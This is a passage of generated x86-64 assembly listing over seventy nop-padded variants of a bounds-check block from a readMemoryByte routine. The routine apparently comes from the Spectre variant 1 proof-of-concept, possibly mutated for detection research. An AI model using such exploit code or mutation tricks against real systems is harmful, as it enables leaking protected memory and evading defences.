	jmp	.LreadMemoryByte_win4_continue
## Variant 36
.LreadMemoryByte_win4_var36:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 37
.LreadMemoryByte_win4_var37:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 38
.LreadMemoryByte_win4_var38:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 39
.LreadMemoryByte_win4_var39:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 40
.LreadMemoryByte_win4_var40:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 41
.LreadMemoryByte_win4_var41:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 42
.LreadMemoryByte_win4_var42:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 43
.LreadMemoryByte_win4_var43:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 44
.LreadMemoryByte_win4_var44:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 45
.LreadMemoryByte_win4_var45:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 46
.LreadMemoryByte_win4_var46:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 47
.LreadMemoryByte_win4_var47:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 48
.LreadMemoryByte_win4_var48:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 49
.LreadMemoryByte_win4_var49:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 50
.LreadMemoryByte_win4_var50:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 51
.LreadMemoryByte_win4_var51:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 52
.LreadMemoryByte_win4_var52:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 53
.LreadMemoryByte_win4_var53:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 54
.LreadMemoryByte_win4_var54:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 55
.LreadMemoryByte_win4_var55:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 56
.LreadMemoryByte_win4_var56:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 57
.LreadMemoryByte_win4_var57:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 58
.LreadMemoryByte_win4_var58:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 59
.LreadMemoryByte_win4_var59:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 60
.LreadMemoryByte_win4_var60:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 61
.LreadMemoryByte_win4_var61:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 62
.LreadMemoryByte_win4_var62:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 63
.LreadMemoryByte_win4_var63:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 64
.LreadMemoryByte_win4_var64:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 65
.LreadMemoryByte_win4_var65:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 66
.LreadMemoryByte_win4_var66:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 67
.LreadMemoryByte_win4_var67:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 68
.LreadMemoryByte_win4_var68:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 69
.LreadMemoryByte_win4_var69:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 70
.LreadMemoryByte_win4_var70:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 71
.LreadMemoryByte_win4_var71:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 72
.LreadMemoryByte_win4_var72:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 73
.LreadMemoryByte_win4_var73:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 74
.LreadMemoryByte_win4_var74:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 75
.LreadMemoryByte_win4_var75:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 76
.LreadMemoryByte_win4_var76:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 77
.LreadMemoryByte_win4_var77:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 78
.LreadMemoryByte_win4_var78:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 79
.LreadMemoryByte_win4_var79:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 80
.LreadMemoryByte_win4_var80:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 81
.LreadMemoryByte_win4_var81:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 82
.LreadMemoryByte_win4_var82:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 83
.LreadMemoryByte_win4_var83:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 84
.LreadMemoryByte_win4_var84:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 85
.LreadMemoryByte_win4_var85:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 86
.LreadMemoryByte_win4_var86:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 87
.LreadMemoryByte_win4_var87:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 88
.LreadMemoryByte_win4_var88:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 89
.LreadMemoryByte_win4_var89:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 90
.LreadMemoryByte_win4_var90:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 91
.LreadMemoryByte_win4_var91:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 92
.LreadMemoryByte_win4_var92:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 93
.LreadMemoryByte_win4_var93:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 94
.LreadMemoryByte_win4_var94:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 95
.LreadMemoryByte_win4_var95:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 96
.LreadMemoryByte_win4_var96:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 97
.LreadMemoryByte_win4_var97:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 98
.LreadMemoryByte_win4_var98:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 99
.LreadMemoryByte_win4_var99:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 100
.LreadMemoryByte_win4_var100:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 101
.LreadMemoryByte_win4_var101:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 102
.LreadMemoryByte_win4_var102:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 103
.LreadMemoryByte_win4_var103:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 104
.LreadMemoryByte_win4_var104:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 105
.LreadMemoryByte_win4_var105:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 106
.LreadMemoryByte_win4_var106:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
